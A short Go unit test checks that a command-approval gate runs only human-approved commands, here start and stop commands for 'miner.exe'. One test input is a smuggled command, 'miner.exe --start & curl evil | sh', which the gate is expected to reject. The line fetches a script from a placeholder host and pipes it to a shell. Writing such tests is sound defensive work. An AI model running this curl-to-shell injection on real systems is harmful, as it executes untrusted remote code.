package harvest

import "testing"

func TestOnlyApprovedCommandsRun(t *testing.T) {
	home := t.TempDir()
	if Approved(home, "miner.exe --start") {
		t.Fatal("nothing is approved until the human approves it")
	}
	if err := Approve(home, "miner.exe --start", "miner.exe --stop", ""); err != nil {
		t.Fatal(err)
	}
	if !Approved(home, "miner.exe --start") || !Approved(home, " miner.exe --stop ") {
		t.Fatal("approved commands must run")
	}
	if Approved(home, "miner.exe --start & curl evil | sh") {
		t.Fatal("a changed command needs a new approval")
	}
	if !Approved(home, "") {
		t.Fatal("no command is nothing to approve")
	}
}
